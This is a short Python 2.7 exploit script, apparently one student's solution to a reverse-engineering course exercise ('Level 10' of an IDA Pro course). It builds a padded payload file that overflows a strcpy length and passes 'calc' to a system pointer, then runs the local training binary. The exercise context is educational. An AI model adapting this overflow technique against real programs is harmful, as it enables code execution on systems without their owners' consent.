# Python 2.7 x86
# Solution for auto evaluation: Level 10
# Curso IDA Pro de Ricardo Narvaja.
# by @rextco
import string
import random
import os
import struct
import sys
import time


def read_file(file_name):
    with open(file_name, "rb") as f:
        content = f.read()
    return bytearray(content)


def write_file(file_name, content):
    with open(file_name, "wb") as f:
        f.write(content)


def random_word(length):
    letters = string.ascii_uppercase
    return "".join(random.choice(letters) for char in range(length))


def make_file():
    print("Exploit!Generate!File")

    # Setup
    stuff = ""
    stuff += "\x30" + 3 * "\x90"
    stuff += "\x51"
    stuff += "\x90" * (18 - len(stuff)) + "\x00"            # Length for strcpy
    stuff += "\x90" * (0x1E - len(stuff))                   # padding
    stuff += "calc" + "\x00"                                # Param for ptr_system
    stuff += "\x90" * (200 - len(stuff))

    write_file("example.txt", stuff)
    print("length = {:d}".format(len(stuff)))
    # print("content = {}".format(stuff))


def read_pipe(ptr_buf):
    buf = ""
    while True:
        line = ptr_buf.readline()
        buf += line
        if "calc" == line:      # simple way to to stop reading pipe
            break
    return buf


def exploit():
    print("Exploit!Subprocess!Call")
    arg_0 = "A:/re/ida/x/examen-level-10/level-10.exe"
    arg_1 = "49"
    arg_2 = ""
    stdin, stdout = os.popen4("{:s} {:s} {:s}".format(arg_0, arg_1, arg_2))
    r = read_pipe(stdout)
    print r


if __name__ == "__main__":
    make_file()
    exploit()
